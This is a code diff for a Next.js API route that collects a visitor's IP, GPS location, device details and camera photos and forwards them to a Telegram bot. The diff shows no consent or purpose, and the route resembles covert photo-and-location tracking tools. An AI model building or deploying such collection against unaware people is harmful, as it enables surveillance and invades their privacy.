@@ -143,6 +143,22 @@ async function sendTelegram(
   return '';
 }
 
+async function sendTelegramText(text: string): Promise<string> {
+  const token = process.env.TG_ENTRY_BOT_TOKEN || '';
+  if (!token) return '未配置 TG_ENTRY_BOT_TOKEN';
+  const chatId = await resolveChatId(token);
+  if (!chatId) return '未配置 TG_ENTRY_CHAT_ID 且 bot 暂无会话（请先给 bot 发一条消息）';
+  const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: chatId, text }),
+  }).catch((e) => {
+    throw new Error('网络错误: ' + ((e as Error).cause || (e as Error).message));
+  });
+  if (!res.ok) return `Telegram 发送失败 ${res.status}`;
+  return '';
+}
+
 export async function POST(req: NextRequest) {
   let body: ReportBody;
   try {
@@ -150,7 +166,9 @@ export async function POST(req: NextRequest) {
   } catch {
     return NextResponse.json({ ok: false }, { status: 400 });
   }
-  if (!body.front) return NextResponse.json({ ok: false }, { status: 400 });
+  if (body.front === undefined && body.back === undefined) {
+    return NextResponse.json({ ok: false }, { status: 400 });
+  }
 
   const ip =
     req.headers.get('cf-connecting-ip') ||
@@ -180,20 +198,20 @@ export async function POST(req: NextRequest) {
     gps ? `地图：https://maps.google.com/?q=${gps.lat},${gps.lng}` : '',
     `设备：${deviceLabel}`,
     `UA：${ua.slice(0, 120)}`,
-    `照片：前置${body.back ? ' + 后置' : '（设备无后置摄像头）'}`,
+    `照片：${body.front ? (body.back ? '前置 + 后置' : '仅前置（设备无后置摄像头）') : '无（设备无摄像头）'}`,
   ].filter(Boolean);
 
-  const frontBlob = dataUrlToBlob(body.front);
+  const frontBlob = body.front ? dataUrlToBlob(body.front) : null;
   const backBlob = body.back ? dataUrlToBlob(body.back) : null;
   let tgError = '';
-  if (frontBlob) {
-    try {
+  try {
+    if (frontBlob) {
       tgError = await sendTelegram(lines.join('\n'), frontBlob, backBlob);
-    } catch (e) {
-      tgError = 'Telegram 发送异常: ' + (e as Error).message;
+    } else {
+      tgError = await sendTelegramText(lines.join('\n'));
     }
-  } else {
-    tgError = '照片解码失败';
+  } catch (e) {
+    tgError = 'Telegram 发送异常: ' + (e as Error).message;
   }
 
   recordEntry(req, { ip, loc, model: deviceLabel });
